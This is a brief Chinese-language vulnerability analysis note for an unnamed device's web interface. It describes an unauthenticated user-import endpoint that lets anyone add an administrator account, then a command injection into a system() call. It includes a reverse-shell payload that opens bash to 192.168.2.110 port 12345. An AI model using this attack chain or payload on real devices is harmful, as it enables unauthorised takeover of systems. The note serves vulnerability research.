---
title: Web处理逻辑
tags: web,漏洞
renderNumberedHeading: true
grammar_cjkRuby: true
---

# 1. 漏洞分析

1. 首先未授权获取目标设备的管理账户权限，在`/spog/importLocalUsers`中，可以未授权导入任意的用户，包含管理员，因此可以使用该接口添加管理员，管理员的密码同样可以通过导入设置

2. 字符串过滤不严格，可以构造命令，污染system执行，命令;bash -i >& /dev/tcp/192.168.2.110/12345 0>&1;#

![命令注入点](./images/1_1.PNG)

![未过滤输入字符串](./images/2.PNG)




